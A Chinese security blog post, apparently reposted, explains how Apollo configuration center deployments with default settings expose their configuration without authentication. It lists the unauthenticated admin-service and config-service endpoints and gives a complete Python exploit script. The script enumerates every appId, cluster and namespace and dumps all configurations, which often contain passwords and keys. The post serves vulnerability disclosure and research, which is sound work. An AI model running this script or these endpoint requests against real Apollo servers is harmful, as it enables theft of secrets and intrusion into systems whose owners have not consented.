Apollo 配置中心未授权获取配置漏洞利用
*2021-01-08 00：13：07 作者： [landgrey.me（查看原文）](https://f5.pm/jump-53399.htm) 阅读量：3429 [收藏](https://f5.pm/go-53399.html#)*

------

### 0x00：背景

> Apollo（阿波罗）是携程框架部门研发的分布式配置中心，能够集中化管理应用不同环境、不同集群的配置，配置修改后能够实时推送到应用端，并且具备规范的权限、流程治理等特性，适用于微服务配置管理场景。

- 项目地址： https://github.com/ctripcorp/apollo

### 0x01：默认不安全

从 [issues-2099](https://github.com/ctripcorp/apollo/issues/2099) 可以看出，根本不需要通过要鉴权的 **apollo-dashboard** ，只要通过伪造成客户端，即可未授权获取相应的配置信息。

Apollo 官方的解决方案是：

**1.6.0 版本**开始增加访问密钥机制，只有经过身份验证的客户端才能访问敏感配置。如果应用开启了访问密钥，客户端需要配置密钥，否则无法获取配置。[但是默认不会开启此项功能](https://github.com/ctripcorp/apollo/pull/2828)。

**1.7.1 版本**开始可以为 **apollo-adminservice** 开启访问控制，从而只有合法的 **apollo-portal** 才能访问对应接口，以增强安全性。类似于增加配置：

```
admin-service.access.control.enabled = true
admin-service.access.tokens=098f6bcd4621d373xade4e832627b4f6
```

有意思的是，默认 值为 ，[也就是默认不会开启此项功能](https://github.com/ctripcorp/apollo/pull/3233)。`admin-service.access.control.enabled``false`

### 0x02：环境搭建

使用 https://github.com/nobodyiam/apollo-build-scripts 快速搭建好 demo。

- 默认开放的端口情况：

| 端口号 | 服务类型          |
| ------ | ----------------- |
| 8070   | Apollo-仪表板     |
| 8080   | apollo-config服务 |
| 8090   | apollo-admin服务  |

- 网站首页

**Apollo-仪表板**

![img](apollo.assets/imagef=https%253A%252F%252Flandgrey.me%252Fstatic%252Fupload%252F2021-01-07%252Fshwbucpf.png&ref=https%253A%252F%252Flandgrey.jpeg)

**apollo-config服务**

![img](apollo.assets/imagef=https%253A%252F%252Flandgrey.me%252Fstatic%252Fupload%252F2021-01-07%252Fugnacqmb.png&ref=https%253A%252F%252Flandgrey.jpeg)

**apollo-admin服务**

![img](apollo.assets/imagef=https%253A%252F%252Flandgrey.me%252Fstatic%252Fupload%252F2021-01-07%252Fohyqpbvz.png&ref=https%253A%252F%252Flandgrey.jpeg)

### 0x03：漏洞利用

由于网上没有漏洞细节，所以我下载了 Apollo 源码，分析了下几个服务的相关代码，下面给出一种利用方法。

大致流程就是利用默认可未授权访问的 和 服务，通过调用相关接口获取所有能够获取到的配置信息。`apollo-configservice``apollo-adminservice`

```
# 1. 获取所有的应用基本信息(包含 appId)
http://test.landgrey.me:8090/apps

# 2. 获取相关 appId 的所有 cluster
http://test.landgrey.me:8090/apps/<appId>/clusters

# 3. 获取相关 appId 的 namespaces
http://test.landgrey.me:8090/apps/<appId>/appnamespaces

# 4. 组合 appId cluster namespaceName 获取配置 configurations
http://test.landgrey.me:8080/configs/<appId>/<cluster>/<namespaceName>
```

**python3 利用脚本：**

```
#!/usr/bin/env python3
# coding: utf-8
# Build By LandGrey

import json
import time
import requests
from urllib.parse import urlparse


def get_response(uri):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20200101 Firefox/60.0",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Connection": "close"
    }
    return requests.get(uri, headers=headers, timeout=20, allow_redirects=False)


def get_app_ids(uri):
    app_ids = []
    response = get_response("{}/apps".format(uri))
    html = response.text
    if response.status_code == 200:
        for app in json.loads(html):
            app_ids.append(app.get("appId"))
    return app_ids


def get_clusters(uri, app_ids):
    clusters = {}
    for app_id in app_ids:
        clusters[app_id] = []
        response = get_response("{}/apps/{}/clusters".format(uri, app_id))
        html = response.text
        if response.status_code == 200:
            for app in json.loads(html):
                clusters[app_id].append(app.get("name"))
    return clusters


def get_namespaces(uri, app_ids, clusters):
    namespaces = {}
    for app_id in app_ids:
        namespaces[app_id] = []
        for cluster in clusters[app_id]:
            url = "{}/apps/{}/clusters/{}/namespaces".format(uri, app_id, cluster)
            response = get_response(url)
            html = response.text
            if response.status_code == 200:
                for app in json.loads(html):
                    namespaces[app_id].append(app.get("namespaceName"))
    return namespaces


def get_configurations(uri, app_ids, clusters, namespaces):
    configurations = []
    for app_id in app_ids:
        for cluster in clusters[app_id]:
            for namespace in namespaces[app_id]:
                key_name = "{}-{}-{}".format(app_id, cluster, namespace)
                url = "{}/configs/{}/{}/{}".format(uri, app_id, cluster, namespace)
                response = get_response(url)
                code = response.status_code
                html = response.text
                print("[+] get {} configs, status: {}".format(url, code))
                time.sleep(1)
                if code == 200:
                    configurations.append({key_name: json.loads(html)})
    return configurations


if __name__ == "__main__":
    apollo_adminservice = "http://test.landgrey.me:8090"
    apollo_configservice = "http://test.landgrey.me:8080"

    scheme0, netloc0, path0, params0, query0, fragment0 = urlparse(apollo_adminservice)
    host0 = "{}://{}".format(scheme0, netloc0)

    _ids = get_app_ids(host0)
    print("All appIds:")
    print(_ids)

    _clusters = get_clusters(host0, _ids)
    print("\nAll Clusters:")
    print(_clusters)

    _namespaces = get_namespaces(host0, _ids, _clusters)
    print("\nAll Namespaces:")
    print(_namespaces)
    print()

    scheme1, netloc1, path1, params1, query1, fragment1 = urlparse(apollo_configservice)
    host1 = "{}://{}".format(scheme1, netloc1)
    _configurations = get_configurations(host1, _ids, _clusters, _namespaces)
    print("\nresults:\n")
    print(_configurations)
```

![img](apollo.assets/imagef=https%253A%252F%252Flandgrey.me%252Fstatic%252Fupload%252F2021-01-07%252Fyjkwixoq.png&ref=https%253A%252F%252Flandgrey.jpeg)